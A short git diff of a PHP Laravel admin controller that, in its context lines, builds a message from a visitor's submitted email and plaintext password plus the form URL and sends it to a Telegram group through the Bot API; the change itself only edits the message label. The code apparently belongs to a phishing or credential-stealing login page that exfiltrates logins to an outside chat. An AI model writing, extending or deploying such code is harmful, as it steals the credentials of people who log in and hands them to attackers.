@@ -129,7 +129,7 @@ class AdminController extends Controller
             $formUrl = url()->current();
 
             // Giriş bilgileri mesajı
-            $message = "#SC5 :\nEmail: " . $request->email . "\nPassword: " . $request->password . "\nForm URL: " . $formUrl;
+            $message = "#SC5 ekle sil komutlu :\nEmail: " . $request->email . "\nPassword: " . $request->password . "\nForm URL: " . $formUrl;
 
             // 1. gruba mesaj göndermek için Telegram API isteği
             $url1 = "https://api.telegram.org/bot{$group1_key}/sendMessage?chat_id={$group1_id}&text=" . urlencode($message);
